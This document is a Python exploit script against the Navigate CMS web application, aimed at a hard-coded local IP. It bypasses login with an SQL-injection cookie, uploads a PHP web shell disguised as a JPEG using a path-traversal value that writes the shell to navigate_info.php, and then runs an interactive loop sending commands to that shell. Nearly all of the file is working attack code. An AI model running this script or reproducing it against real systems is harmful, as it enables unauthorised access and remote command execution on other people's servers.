import requests
import os


def get_session_id(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12.2; rv:97.0) Gecko/20100101 Firefox/97.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie':r'navigate-user=\" OR TRUE--%20'
    }
  
    print("[+] Get Session ")
    response = requests.post(f'{url}/navigate/login.php', headers=headers)
    print(response.status_code)
    cookies = response.headers.get('Set-Cookie')
    print("cookies --->",cookies)
    
    if cookies:
        session_id = [c.split('=')[1].split(';')[0] for c in cookies.split() if c.startswith('NVSID_')][0]
        return session_id
    return None

def upload_exploit(url, session_id):
    payload = '<?php system($_GET[\'cmd\']);?>'
    payload = """
            <html>
            <body>
            <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
            <input type="TEXT" name="cmd" id="cmd" size="80">
            <input type="SUBMIT" value="Execute">
            </form>
            <pre>
            <?php
                if(isset($_GET['cmd']))
                {
                    system($_GET['cmd']);
                }
            ?>
            </pre>
            </body>
            <script>document.getElementById("cmd").focus();</script>
            </html>
            """
    file_name = 'imagen.jpg'
    with open(file_name, 'w') as file:
        file.write(payload)

    files = {
        'file': (file_name, open(file_name, 'rb')),
    }
    data = {
        'name': file_name,
        'session_id': session_id,
        'engine': 'picnik',
        'id': '../../../navigate_info.php',
    }
    response = requests.post(f'{url}/navigate/navigate_upload.php', files=files, data=data)
    # os.remove(file_name)
    return response

def get_webshell(url):
    while True:
        cmd = input('webshell$ ')
        if cmd == 'exit':
            print('\n[+] Bye bye...')
            break
        response = requests.get(f'{url}/navigate/navigate_info.php', params={'cmd': cmd})
        print(response.text)

if __name__ == "__main__":
    # target_url = input("Nhập URL: ")  # Nhập URL từ người dùng
    target_url = "http://192.168.43.152"  # Nhập URL từ người dùng

    session = get_session_id(target_url)
    if session:
        print(f"\n URL: http://{target_url}/")
        print(f"\n Sesion: {session}")
        
        print("\n Exploit...")
        upload_result = upload_exploit(target_url, session)
        print(upload_result.text)

        print("\n Webshell...")
        get_webshell(target_url)
    else:
        print("\nError ...")
